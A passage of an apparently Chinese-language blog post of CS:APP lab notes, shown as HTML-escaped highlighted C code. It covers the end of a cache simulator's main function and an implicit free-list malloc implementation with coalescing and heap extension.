                printUsage(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;v&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
                v &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
                s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(optarg);
                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;E&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
                E &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(optarg);
                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
                b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(optarg);
                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
                tracefile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; optarg;
                fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(tracefile, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL) {
                    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;File %s open failed.&amp;#34;&lt;/span&gt;, tracefile);
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
                }
                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
                printUsage(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (s &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; E &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;tracefile &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
        printUsage(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
    S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; s;
    B &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; b;

    initCache();
    replayTrace(fp);

    printSummary(hit_count, miss_count, eviction_count);

    releaseCache();
    fclose(fp);
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;lab10-malloc-lab&#34;&gt;Lab10 Malloc-lab&lt;/h2&gt;
&lt;p&gt;实现了两种 Malloc&lt;/p&gt;
&lt;h3 id=&#34;隐式链表&#34;&gt;隐式链表&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+-----------------+
| chunksize | 00A | A: Alloc
+-----------------+
|    (padding)    |
+-----------------+
| chunksize | 00A | A: Alloc
+-----------------+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;宏定义&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* single word (4) or double word (8) alignment */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define ALIGNMENT 8
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define WSIZE 4                 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Word and header/footer size (bytes) */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DSIZE 8                 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Double word size (bytes) */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define CHUNKSIZE (1 &amp;lt;&amp;lt; 12)     &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Extend hea by this amount (bytes) */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define MAX(x, y) ((x) &amp;gt; (y) ? (x) : (y))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* rounds up to the nearest multiple of ALIGNMENT */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define ALIGN(size) (((size) + (ALIGNMENT-1)) &amp;amp; ~0x7)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define SIZE_T_SIZE (ALIGN(sizeof(size_t)))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* Pack a size and allocated bit into a word */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define PACK(size, alloc) ((size) | (alloc))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* Read and write a word at address p */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define GET(p) (*(unsigned int*)(p))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define PUT(p, val) (*(unsigned int*)(p) = (val))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define GET_SIZE(p) (GET(p) &amp;amp; ~0x7)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define GET_ALLOC(p) (GET(p) &amp;amp; 0x1)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* Given block ptr bp, compute address of its header and footer */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define HDRP(bp) ((char*)(bp) - WSIZE)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define FTRP(bp) ((char*)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* Given block ptr bp, compute address of next and previous blocks */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char*)(bp) - WSIZE)))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char*)(bp) - DSIZE)))
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用宏定义编译方便一些&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define FIRST_FIT 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NEXT_FIT 2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define BEST_FIT 3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一些全局变量&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;heap_listp;

&lt;span style=&#34;color:#75715e&#34;&gt;#if FIT_ALGO == NEXT_FIT
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;cur_listp;
&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;核心代码直接抄书：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * coalesce - Coalesce free block next by
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;coalesce&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp) {
    size_t prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_ALLOC(FTRP(PREV_BLKP(bp)));
    size_t next_alloc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_ALLOC(HDRP(NEXT_BLKP(bp)));

    size_t size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(bp));
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; next_alloc)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;next_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; prev_alloc) {
        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; GET_SIZE(HDRP(NEXT_BLKP(bp)));
        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; next_alloc) {
        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; GET_SIZE(FTRP(PREV_BLKP(bp)));
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PREV_BLKP(bp);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;next_alloc) {
        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; GET_SIZE(FTRP(PREV_BLKP(bp)));
        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; GET_SIZE(HDRP(NEXT_BLKP(bp)));
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PREV_BLKP(bp);
    };

&lt;span style=&#34;color:#75715e&#34;&gt;#if FIT_ALGO == NEXT_FIT
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; bp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; NEXT_BLKP(bp))
        cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bp;
&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
}

&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * extend_heap - extend heap with a free block
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;extend_heap&lt;/span&gt;(size_t words) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp;
    size_t size;
    &lt;span style=&#34;color:#75715e&#34;&gt;/* Allocate and even number of words to maintain alignment */&lt;/span&gt;
    size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (words &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; (words &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE : words &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)(bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mem_sbrk(size)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;

    &lt;span style=&#34;color:#75715e&#34;&gt;/* Initialize free block header/footer and the epilogue header */&lt;/span&gt;
    PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
    PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
    PUT(HDRP(NEXT_BLKP(bp)), PACK(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));

    &lt;span style=&#34;color:#75715e&#34;&gt;/* Coalesce if the previous block was free */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; coalesce(bp);
}

&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_init - initialize the malloc package.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mm_init&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
{
    &lt;span style=&#34;color:#75715e&#34;&gt;/* Create the initial empty heap */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mem_sbrk(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)   &lt;span style=&#34;color:#75715e&#34;&gt;/* sbrk() function returns the start address of the new area. */&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    PUT(heap_listp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);                                     &lt;span style=&#34;color:#75715e&#34;&gt;/* Alignment */&lt;/span&gt;
    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(DSIZE, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));          &lt;span style=&#34;color:#75715e&#34;&gt;/* Prologue block&amp;#39;s size is 8 and is always alloced */&lt;/span&gt;
    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(DSIZE, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));              &lt;span style=&#34;color:#75715e&#34;&gt;/* Epilogue header */&lt;/span&gt;
    heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE);
    
&lt;span style=&#34;color:#75715e&#34;&gt;#if FIT_ALGO == NEXT_FIT
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap_listp;
&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (extend_heap(CHUNKSIZE&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;WSIZE) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}

&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_malloc - Allocate a block by incrementing the brk pointer.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *     Always allocate a block whose size is a multiple of the alignment.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mm_malloc&lt;/span&gt;(size_t size)
{
    &lt;span style=&#34;color:#75715e&#34;&gt;/* Ignore spurious requests */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; DSIZE)
        size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; DSIZE;
    size_t newsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; DSIZE &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;size) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; DSIZE);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; bp;
    &lt;span style=&#34;color:#75715e&#34;&gt;// int newsize = ALIGN(size + SIZE_T_SIZE);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_fit(newsize)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL) {
        place(bp, newsize);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
    }
    size_t extendsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MAX(newsize, CHUNKSIZE);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; extend_heap(extendsize&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;WSIZE)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
	   &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    place(bp, newsize);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
}

&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_free - Freeing a block does nothing.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mm_free&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr)
{
    size_t size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(ptr));

    PUT(HDRP(ptr), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
    PUT(FTRP(ptr), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));

    coalesce(ptr);
}

&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_realloc - Implemented simply in terms of mm_malloc and mm_free
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mm_realloc&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr, size_t size)
{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;oldptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr;
